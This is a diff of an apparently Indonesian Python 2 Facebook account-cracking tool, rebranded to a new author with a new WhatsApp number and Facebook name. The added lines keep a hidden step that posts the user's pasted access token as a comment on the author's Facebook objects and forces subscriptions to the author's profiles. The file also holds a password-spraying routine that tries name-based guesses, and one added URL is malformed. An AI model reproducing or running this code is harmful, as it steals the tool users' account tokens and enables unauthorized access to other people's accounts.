@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-# author : Sanz Tzy
+# author : Ahmed Alzwage 
 
 ### IMPORT MODULE ###
 import os, sys, re, time, requests, calendar, random,json
@@ -85,7 +85,7 @@ def logo():
  \x1b[1;92m _________             \x1b[1;93m_____    _______   \x1b[1;92m__________
  \x1b[1;92m/   _____/            \x1b[1;93m/  _  \   \      \  \x1b[1;92m\____    /
  \x1b[1;92m\_____  \   \x1b[1;93m_______  /  /_\  \  /   |   \   \x1b[1;92m/     /
- \x1b[1;92m/ V2.1   \ \x1b[1;93m/______/ /    |    \/    |    \ \x1b[1;92m/     /_ 
+ \x1b[1;92m/             \ \x1b[1;93m/______/ /    |    \/    |    \ \x1b[1;92m/     /_ 
  \x1b[1;92m/______  /          \x1b[1;93m\____|__  /\____|__  /\x1b[1;92m/_______ \  
  \x1b[1;92m       \/     \x1b[1;93m              \/         \/         \x1b[1;92m\/    """%(N))
  
@@ -100,20 +100,20 @@ def tokenz():
 		os.system('clear')
                 logo()
                 print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
-                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mSanz Tzy"%(N))     
-		print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m081210xxxx"%(N))   
-		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mFacebook   \x1b[1;93m: \x1b[1;93mBintang Tzy")      
+                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mAhmed Alzwage "%(N))     
+		print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m+218921762445"%(N))   
+		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mFacebook   \x1b[1;93m: \x1b[1;93mHacker Libya ")      
 		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")     
 		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s"%(tgl))                     
-		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;91mA M P A S%s"%(H,N)) 
-                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mYautube     \x1b[1;93m: \x1b[1;93mBintang XD"%(N))
+		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;91mL I B Y A%s"%(H,N)) 
+                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mYautube     \x1b[1;93m: \x1b[1;93mPRO"%(N))
                 print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")               
                 print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                 print '%s \x1b[1;92m╠══><%s \x1b[1;93musahakan akun tumbal login di google chrome terlebih dahulu'%(B,N)
                 print '%s \x1b[1;92m╠══><%s \x1b[1;93mjangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H)
                 print '%s \x1b[1;92m╠══><%s \x1b[1;93msetelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H)
                 print '%s \x1b[1;92m╠══><%s \x1b[1;93mlalu klik %sCari di Halaman%s \x1b[1;93mTinggal ketik %sEAAA%s \x1b[1;93mLalu salin'%(B,N,H,N,H,N)
-                print(" \x1b[1;92m╠══><%s \x1b[1;93mSihlakan kunjungi Facebook me \x1b[1;92mBintang Tzy \x1b[1;93mTerimakasih."%(N))
+                print(" \x1b[1;92m╠══><%s \x1b[1;93mSihlakan kunjungi Facebook me \x1b[1;92mHacker Libya \x1b[1;93mTerimakasih."%(N))
                 print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                 print('%s \x1b[1;92m║'%(O))
 		token = raw_input(' \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mtoken Fb disini \x1b[1;93m: \x1b[1;92m')
@@ -135,15 +135,9 @@ def bot():
 		token = open('token.txt', 'r').read()
 	except (KeyError, IOError):
 		exit(" %s[!] token kadaluwarsa!"%(M))
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
-	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
-	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
-	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/567912789/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100000972552823/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/10159760584172790/comments/?message='+token+'&access_token=' + token)
 
 ### BAGIAN MENU ###
 def menu():
@@ -717,7 +711,7 @@ def sandiotomatis():
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
-				fall.submit(mfbasic, uid, pwx,"https://b-api.facebook.com")
+				fall.submit(mfbasic, uid, pwx,"https://https://b-api.facebook.com/method/auth.login")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 		
 ### BAGIAN CRACK ###
